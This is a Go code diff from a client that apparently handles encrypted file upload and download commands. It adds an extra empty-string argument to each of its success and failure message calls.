@@ -37,7 +37,7 @@ func fileUploadCmd(sendUserId, decData string) {
 		if err != nil {
 			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, "file dir create error")
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg, "")
 			debug.DebugPrint(sendUserId + "file dir create error")
 			setchannel.DeleteFileSliceDataChan(sendUserId)
 			return
@@ -57,7 +57,7 @@ func fileUploadCmd(sendUserId, decData string) {
 		case <-time.After(5 * time.Second):
 			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, "file upload failed")
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg, "")
 			debug.DebugPrint(sendUserId + " upload file error")
 			setchannel.DeleteFileSliceDataChan(sendUserId)
 			return
@@ -67,11 +67,11 @@ func fileUploadCmd(sendUserId, decData string) {
 	if md5sum == saveFileMd5 {
 		data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "file upload success")
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendSuccessMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
+		common.SendSuccessMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg, "")
 	} else {
 		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "file upload failed")
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg, "")
 	}
 }
 
@@ -85,7 +85,7 @@ func fileDownloadCmd(sendUserId, decData string) {
 	saveFile := requestFile.SaveFileName
 	if !fileopt.IsFile(destFile) {
 		failMsg := colorcode.OutputMessage(colorcode.SIGN_ERROR, "dest file is not exist")
-		common.SendFailMsg(sendUserId, common.ClientId, failMsg, "")
+		common.SendFailMsg(sendUserId, common.ClientId, failMsg, "", "")
 		return
 	}
 	metaInfoMsg := fileopt.GetFileMetaInfo(destFile, saveFile)
